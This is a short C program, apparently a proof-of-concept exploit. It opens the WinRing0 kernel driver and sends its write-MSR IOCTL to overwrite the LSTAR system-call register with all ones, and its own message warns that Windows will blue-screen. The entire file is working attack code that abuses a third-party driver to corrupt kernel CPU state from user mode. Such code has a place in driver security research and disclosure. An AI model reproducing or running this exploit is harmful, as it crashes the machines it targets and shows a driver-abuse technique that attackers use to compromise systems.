#define DEVICE_NAME_W L"\Device\WinRing0_1_2_0"
#define IOCTL_WRMSR 0x9c402088

typedef struct DRIVER_STRUCT {
	DWORD Affinity;
	DWORD MsrIndex;
	DWORD64 Value;
}WRMSR_STRUCT, * PWRMSR_STRUCT;

HANDLE hDevice = NULL;
WCHAR* DevicePath = NULL;

BOOL OpenDriverDevice() {
	DevicePath = (LPWSTR)malloc((MAX_PATH + 1) * sizeof(WCHAR));
	swprintf_s(DevicePath, MAX_PATH, L"\\\\.\\%ws", DEVICE_NAME_W);
	hDevice = CreateFileW(DevicePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	return TRUE;
}

void CloseDriverDevice() {
	if (DevicePath) {
		free(DevicePath);
	}
	if (hDevice) {
		CloseHandle(hDevice);
	}
}

BOOL WriteMSR(DWORD MsrIndex, DWORD64 Value) {
	WRMSR_STRUCT wrmsr;
	HANDLE hProcess = NULL;
	DWORD_PTR ProcessAffinityMask = 0;
	DWORD_PTR SystemAffinityMask = 0;
	BYTE buffer[1024] = { 0 };
	DWORD bytesReturned;

	ZeroMemory(&wrmsr, sizeof(wrmsr));

	hProcess = GetCurrentProcess();
	GetProcessAffinityMask(hProcess, &ProcessAffinityMask, &SystemAffinityMask);

	wrmsr.Affinity = (DWORD)SystemAffinityMask;
	wrmsr.MsrIndex = MsrIndex;
	wrmsr.Value = Value;

	DEBUG(L"[*] Press ENTER to continue (OS will BSOD!)\r\n");
	getchar();

	DeviceIoControl(hDevice, IOCTL_WRMSR, &wrmsr, sizeof(wrmsr), buffer, sizeof(buffer), &bytesReturned, NULL);

	return TRUE;
}

int main(int argc, char* argv[]) {
	DWORD lstar_msr = 0xc0000082;
	
	if (!OpenDriverDevice()) {
		CloseDriverDevice();
		return 0;
	}

	WriteMSR(lstar_msr, 0xffffffffffffffff);

	CloseDriverDevice();
	return 0;
}
